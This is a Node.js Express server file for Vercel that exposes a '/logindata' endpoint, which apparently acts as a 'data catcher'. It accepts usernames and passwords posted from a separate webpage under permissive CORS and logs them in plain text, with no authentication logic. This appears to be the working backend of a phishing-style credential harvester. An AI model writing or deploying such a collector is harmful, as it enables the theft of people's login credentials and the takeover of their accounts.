// api/server.js
const express = require('express');
const cors = require('cors');

const app = express();

// Middleware
app.use(cors()); // Allows your webpage to talk to this catcher
app.use(express.json()); // Helps understand data sent as JSON

// This is where the data comes in
// The path here will be relative to the /api route Vercel creates
// So, if Vercel URL is X, this endpoint will be X/api/server (if no specific routes in vercel.json)
// OR X/logindata if we map it in vercel.json (which we will)
app.post('/logindata', (req, res) => {
    const { username, password } = req.body;
    const timestamp = new Date().toISOString();

    if (!username || !password) {
        // It's good practice to explicitly return after sending a response
        return res.status(400).json({ message: 'Username and password are required.' });
    }

    console.log("--- DATA RECEIVED (Vercel) ---");
    console.log("Timestamp:", timestamp);
    console.log("Username:", username);
    console.log("Password:", password, "<-- WARNING: This is plain text!");
    console.log("------------------------------");

    // Tell the webpage "Ok, I got it!"
    return res.status(200).json({ message: 'Data received by Vercel catcher!' });
});

// A test route to see if the API itself is accessible
app.get('/', (req, res) => {
    return res.send('My Vercel Data Catcher API is alive!');
});


// IMPORTANT: For Vercel, we export the app instead of listening on a port.
// Vercel handles the listening part.
module.exports = app;